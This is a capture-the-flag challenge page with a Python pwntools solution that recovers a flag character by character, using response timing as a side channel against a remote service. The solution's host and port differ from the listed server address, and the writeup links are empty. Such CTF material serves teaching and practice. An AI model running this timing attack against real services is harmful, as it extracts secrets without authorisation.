#### Goals
 * Try to find the flag

#### Server Address
 * nc misc.sniperoj.com 30001

#### Solution
```python

#!/usr/bin/env python

from pwn import *
import time
import sys


Io = remote("www.sniperoj.cn", 30018)

def guess(data, char):
    print "[+] Guessing : [%s]" % (data + char)
    Io.sendline(data + char)
    start_time = time.time()
    print Io.readuntil("Give me flag:")
    end_time = time.time()
    offset = end_time - start_time
    result = offset / 0.25
    temp = (len(data + char) * 0.25 - offset)
    return (temp < 0)


print Io.readuntil("Give me flag:")
print Io.readuntil("Give me flag:")

data = ""

while True:
    for i in range(127, 32, -1):
        if guess(data, chr(i)):
            data += chr(i)
            print "[+] Found [%s]" % (data)
            break
```

#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

